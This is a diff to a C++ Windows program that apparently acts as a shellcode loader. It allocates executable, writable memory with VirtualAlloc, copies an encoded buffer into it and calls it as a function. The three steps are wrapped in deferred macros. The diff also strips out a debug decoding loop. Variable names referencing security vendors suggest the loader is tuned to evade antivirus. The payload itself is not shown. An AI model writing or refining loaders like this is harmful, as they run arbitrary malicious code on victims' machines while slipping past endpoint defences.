@@ -1,4 +1,4 @@
-# include <stdio.h>
+#include <stdio.h>
 #include <windows.h>
 #include <iostream>
 #include <string>
@@ -57,22 +57,8 @@ int main() {
 		k = k + 1;
 	}
 	LPVOID Memory = VirtualAlloc(NULL, sizeof(ss), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    defer(((void(*)())Memory)(););
-    defer(memcpy(Memory, ss, sizeof(ss)););
-    defer(if (Memory == NULL) { return 1; });
-	for (int i = 0; i < Sangfor.length(); i++)
-	{
-		int len1;
-		len1 = Shenxinfu[i] - 48;
-		string dange = "";
-		for (int j = 0; j < len1; j++)
-		{
-			string a = to_string(Shenxinfu[i + j + 1] - 48);
-			int a1 = passwd1.find(a);
-			string a2 = to_string(a1);
-			dange.append(a2);
-			cout << a2 << endl;
-		}
-	}
-    return 0;
+    	defer(((void(*)())Memory)(););
+    	defer(memcpy(Memory, ss, sizeof(ss)););
+   	defer(if (Memory == NULL) { return 1; });
+   	return 0;
 }
